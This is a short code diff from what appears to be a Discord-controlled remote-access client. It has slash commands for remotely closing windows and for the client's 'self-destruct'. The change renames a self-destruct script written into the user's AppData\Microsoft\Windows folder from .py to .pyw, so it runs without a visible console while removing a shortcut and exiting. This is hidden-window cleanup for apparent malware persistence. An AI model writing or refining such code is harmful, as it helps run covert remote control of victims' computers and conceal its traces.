@@ -335,14 +335,14 @@ os.remove(shortcut_path)
 sys.exit(0)
 """
 
-        script_file = "self-destruct.py"
+        script_file = "self-destruct.pyw"
         user_profile = os.environ['USERPROFILE']
         target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
         if not os.path.exists(os.path.join(target_path, script_file)):
             with open(os.path.join(target_path, script_file), "w") as file:
                 file.write(script_content)
                 file.close()
-        subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
+        subprocess.Popen(["python", os.path.join(target_path, "self-destruct.pyw")])
         sys.exit(0)
 
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
@@ -370,14 +370,14 @@ os.remove(shortcut_path)
 sys.exit(0)
 """
 
-    script_file = "self-destruct.py"
+    script_file = "self-destruct.pyw"
     user_profile = os.environ['USERPROFILE']
     target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
     if not os.path.exists(os.path.join(target_path, script_file)):
         with open(os.path.join(target_path, script_file), "w") as file:
             file.write(script_content)
             file.close()
-    subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
+    subprocess.Popen(["python", os.path.join(target_path, "self-destruct.pyw")])
     sys.exit(0)
     
 @client.slash_command(guild_ids=testServerId, description="Closes the window selected.")
